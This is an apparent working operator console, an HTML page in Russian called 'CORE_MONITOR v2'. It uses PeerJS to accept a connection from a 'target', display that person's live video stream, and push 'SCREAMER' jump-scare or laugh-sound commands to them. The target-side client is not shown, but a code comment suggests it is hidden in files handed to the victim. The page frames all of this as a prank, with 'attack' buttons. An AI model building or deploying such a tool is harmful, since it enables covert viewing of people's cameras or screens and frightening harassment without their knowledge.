<!DOCTYPE html>
<html>
<head>
    <title>Управление Сетями AI (Ваниш)</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; display: flex; height: 100vh; margin: 0; }
        .sidebar { width: 300px; background: #111; border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; }
        .main { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        video { width: 100%; max-width: 600px; border: 3px solid #ff0050; border-radius: 12px; background: #000; margin-top: 20px; box-shadow: 0 0 20px rgba(255, 0, 80, 0.4); }
        .status { font-size: 18px; margin-bottom: 20px; }
        .btn-panel { background: #1a1a1a; padding: 15px; border-radius: 10px; border: 1px solid #333; margin-top: 20px; text-align: center; }
        .btn { padding: 10px 20px; margin: 5px; font-size: 14px; cursor: pointer; border-radius: 5px; font-weight: bold; text-transform: uppercase; border: none; }
        .btn-scary { background: red; color: white; }
        .btn-fun { background: cyan; color: black; }
        .user-card { background: #222; padding: 10px; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>
    <audio id="login-sound" src="https://www.myinstants.com/media/sounds/hacking-sound-effect.mp3"></audio>

    <div class="sidebar">
        <h2>CORE_MONITOR v2</h2>
        <div id="status" class="status">СТАТУС: ПОИСК...</div>
        <div id="user-info"></div>
    </div>

    <div class="main">
        <h1>АКТИВНАЯ ТРАНСЛЯЦИЯ</h1>
        <video id="remoteVideo" autoplay playsinline muted></video>

        <div class="btn-panel">
            <p>Управление пранком:</p>
            <button id="attackBtn" class="btn btn-scary" onclick="sendAttack('SCREAMER')" disabled>⚡ СКРИМЕР ⚡</button>
            <button id="laughBtn" class="btn btn-fun" onclick="sendAttack('SOUND', 'LAUGH')" disabled>😂 СМЕХ 😂</button>
        </div>
    </div>

    <script>
        const MY_ID = '09062012'; // Твой ID из файлов
        const peer = new Peer(MY_ID);
        let activeConn = null;

        peer.on('connection', conn => {
            activeConn = conn;
            document.getElementById('login-sound').play().catch(() => {});
            document.getElementById('status').innerText = "ЦЕЛЬ ПОДКЛЮЧЕНА";
            document.getElementById('status').style.color = "#ff0050";
            document.getElementById('user-info').innerHTML = `<div class="user-card">> TARGET_CONNECTED: ${conn.peer}</div>`;
            
            // Активируем кнопки
            document.querySelectorAll('.btn').forEach(btn => btn.disabled = false);
        });

        peer.on('call', call => {
            call.answer(); //
            call.on('stream', stream => {
                const video = document.getElementById('remoteVideo');
                video.srcObject = stream;
                video.play();
            });
        });

        function sendAttack(type, content = null) {
            if (activeConn && activeConn.open) {
                activeConn.send({ type: type, content: content }); //
            }
        }
        
        // Кликни по странице, чтобы звук работал
        window.onclick = () => { console.log("Звуковая система готова"); };
    </script>
</body>
</html>
